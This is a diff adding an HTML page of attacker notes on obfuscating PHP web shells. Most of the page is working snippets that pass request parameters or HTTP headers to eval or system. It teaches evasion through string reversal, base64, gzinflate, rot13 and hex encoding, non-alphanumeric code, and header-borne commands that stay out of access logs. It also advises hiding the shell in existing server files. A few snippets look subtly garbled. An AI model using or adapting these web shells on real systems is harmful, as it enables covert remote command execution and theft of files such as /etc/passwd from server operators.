@@ -1,0 +1,115 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Evasion / Obfuscation techniques</title>
+</head><body><b>Filtering on base64? php has strrev. Common evasion is base64_decode(payload)</b><br/>
+&lt;?<br/>
+$b = strerev(edoced_4&quot; . &quot;6esab&quot;);<br/>
+eval($b ($_REQUEST['c']) );<br/>
+?&gt;<br/>
+<br/>
+<b>Obfuscated (not reliable?)<br/>
+</b><b>you can execute it like &quot;shell.php?0=system&amp;1=ls&quot;</b><br/>
+&lt;?<br/>
+@$_[]=@! _; $__=@${_}&gt;&gt;$_;$_[]=$__;$_[]=@_;$_[(( $__) ($__  ))].=$_;<br/>
+$_[]= $__; $_[]=$_[--$__][$__&gt;&gt;$__];$_[$__].=(($__ $__) $_[$__-$__]).($__ $__ $__) $_[$__-$__];<br/>
+$_[$__ $__] =($_[$__][$__&gt;&gt;$__]).($_[$__][$__]^$_[$__][($__&lt;&lt;$__)-$__] );<br/>
+$_[$__ $__] .=($_[$__][($__&lt;&lt;$__)-($__/$__)])^($_[$__][$__] );<br/>
+$_[$__ $__] .=($_[$__][$__ $__])^$_[$__][($__&lt;&lt;$__)-$__ ];<br/>
+$_=$ <br/>
+$_[$__ $__] ;$_[@-_]($_[@! _] );<br/>
+?&gt;<br/>
+<br/>
+<b>You can execute it like &quot;shell.php?_=system&amp;__=ls&quot;</b><br/>
+&lt;?php<br/>
+$_=&quot;{&quot;; <br/>
+$_=($_^&quot;&lt;&quot;).($_^&quot;&gt;;&quot;).($_^&quot;/&quot;);<br/>
+?&gt;<br/>
+&lt;?=${'_'.$_}[&quot;_&quot;](${'_'.$_}[&quot;__&quot;]);?&gt;<br/>
+<br/>
+<span style="font-family: inherit"><span style="font-size: 10pt"><b>Something more subtle for cmd injection would be:</b></span></span><br/>
+	&lt;?php system($_SERVER['HTTP_ACCEPT_LANGUAGE']); ?&gt;<span style="font-size: 10pt"><span style="font-family: inherit">	&lt;- nothing in access log! Edit Accept-Language header in web proxy</span></span><br/>
+<span style="font-family: inherit"><span style="font-size: 10pt">	or &lt;?php system($_SERVER['HTTP_USER_AGENT'])?&gt;</span></span><br/>
+<br/>
+Hide you php in another php file already on the server!<br/>
+Attacker can use the @ operator before a function to suppress any errors that may be thrown and written to the error log<br/>
+<br/>
+<b>Remove whitespace </b><br/>
+By removing the whitespace from a block of code, it looks like a big string making it less readable and harder to identify what the script does.<br/>
+<br/>
+&lt;?php <br/>
+// Whitespace makes things easy to read <br/>
+function myshellexec($cmd){<br/>
+global $disablefunc; $result = &quot;&quot;;<br/>
+if (!empty($cmd)){<br/>
+if (is_callable(&quot;exec&quot;) &amp;&amp; !in_array(&quot;exec&quot;,$disablefunc)) {<br/>
+exec($cmd,$result); $result = join(&quot;&quot;,$result);<br/>
+}<br/>
+}<br/>
+} <br/>
+// Whitespace removed makes things harder to read <br/>
+function myshellexec($cmd) {global $disablefunc;$result = &quot;&quot;;<br/>
+if(!empty($cmd)) { if (is_callable(&quot;exec&quot;) and<br/>
+!in_array(&quot;exec&quot;,$disablefunc)){exec($cmd,$result); $result=join(&quot; &quot;,$result);}}} <br/>
+?&gt;<br/>
+<br/>
+<b>Scrambling alternate base64 reverse </b><br/>
+Scrambling is a technique that can be used effectively in combination with others to help a web shell go undetected. It scrambles the code making it unreadable and makes use of various functions that will reconstruct the code when run.<br/>
+<br/>
+&lt;?php<br/>
+// Scrambled<br/>
+ $k='c3lzdGVtKCdscyAtbGEnKTs=';$c=strrev('(edoced_46esab.&quot;&quot;nruter').&quot;'&quot;.$k.&quot;');&quot;;$f=eval($c);eval($f);<br/>
+<br/>
+// Unscrambled<br/>
+ // base_64 encoded string -&gt; system('ls -la');<br/>
+ $k='c3lzdGVtKCdscyAtbGEnKTs=';<br/>
+ // strrev() reverses a given string:  strrev('(edoced_46esab.&quot;&quot;nruter').&quot;'&quot;.$k.&quot;')<br/>
+$c= eval(&quot;return base64_decode('c3lzdGVtKCdscyAtbGEnKTs=');&quot;);<br/>
+ // $c = system('ls -la');<br/>
+ $f=eval($c);<br/>
+ eval($f);<br/>
+<br/>
+<b>More encoding techniques</b><br/>
+The following examples all produce the same result, however, an attacker might choose to use more obfuscated techniques in order for the web shell to keep a low profile.<br/>
+<br/>
+&lt;?php<br/>
+ // Evaluates the string &quot;system('ls -la');&quot; as PHP code<br/>
+ eval(&quot;system('ls -la');&quot;);<br/>
+ <br/>
+ // Decodes the Base64 encoded string and evaluates the decoded string &quot;system('ls -la');&quot; as PHP code<br/>
+ eval(base64_decode(&quot;c3lzdGVtKCdscyAtbGEnKTsNCg==&quot;));<br/>
+ <br/>
+ // Decodes the compressed, Base64 encoded string and evaluates the decoded string &quot;system('ls -la');&quot; as PHP code<br/>
+ eval(gzinflate(base64_decode('K64sLknN1VDKKVbQzUlU0rQGAA==')));<br/>
+ <br/>
+ // Decodes the compressed, ROT13 encoded, Base64 encoded string and evaluates the decoded string &quot;system('ls -la');&quot; as PHP code<br/>
+eval(gzinflate(str_rot13(base64_decode('K64sLlbN1UPKKUnQzVZH0rQGAA=='))));<br/>
+<br/>
+ // Decodes the compressed, Base64 encoded string and evaluates the decoded string &quot;system('ls -la');&quot; as PHP code<br/>
+ assert(gzinflate(base64_decode('K64sLknN1VDKKVbQzUlU0rQGAA==')));<br/>
+?&gt;<br/>
+<br/>
+<b>Hex encoding<br/>
+</b>Let’s take the following string as an example.<br/>
+<br/>
+system('cat /etc/passwd');<br/>
+The following is the above string’s value in hexadecimal.<br/>
+<br/>
+73797374656d2827636174202f6574632f70617373776427293b<br/>
+Therefore, the following code can be used to accept a hexadecimal-encoded string and evaluate it as PHP code.<br/>
+<br/>
+&lt;?php &lt;br ?--&gt; // function that accepts a hex encoded data<br/>
+function dcd($hex){<br/>
+// split $hex<br/>
+for ($i=0; $i &lt; strlen($hex)-1; $i+=2){ <br/>
+//run hexdec on every two characters to get their decimal representation which will be then used by char() to find the corresponding ASCII character<br/>
+$string .= chr(hexdec($hex[$i].$hex[$i+1])); <br/>
+} <br/>
+// evaluate/execute the command <br/>
+eval($string); <br/>
+} <br/>
+dcd('73797374656d2827636174202f6574632f70617373776427293b'); <br/>
+?&gt;<br/>
+<br/>
+<br/>
+</body></html>
